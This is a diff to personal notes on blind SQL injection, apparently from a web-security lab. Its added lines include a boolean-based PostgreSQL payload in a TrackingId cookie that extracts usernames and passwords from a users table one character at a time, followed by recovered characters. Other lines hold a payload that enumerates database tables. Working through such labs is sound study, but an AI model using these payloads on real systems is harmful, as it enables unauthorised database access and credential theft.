@@ -262,7 +262,13 @@ TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(column_name,':'
 
 117  u
 115  s
+101  
 
+# pwn
+TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(username||':'||password,','),1,1))+FROM+users+LIMIT+1)=97--;
+
+97   a
+100  d
 ```
 
 # drafts
@@ -291,4 +297,7 @@ select firstname from scientist where firstname = 'albert' and ascii(substring((
 
 # try now <<-- didn't work
 TrackingId=obviouslywrong'+AND+ASCII(SUBSTRING((select+string_agg(tablename,':')+from+pg_catalog.pg_tables),1,1))=80--
+
+# string_agg multiple columns
+select string_agg(firstname||':'|| lastname,',') from scientist;
 ```
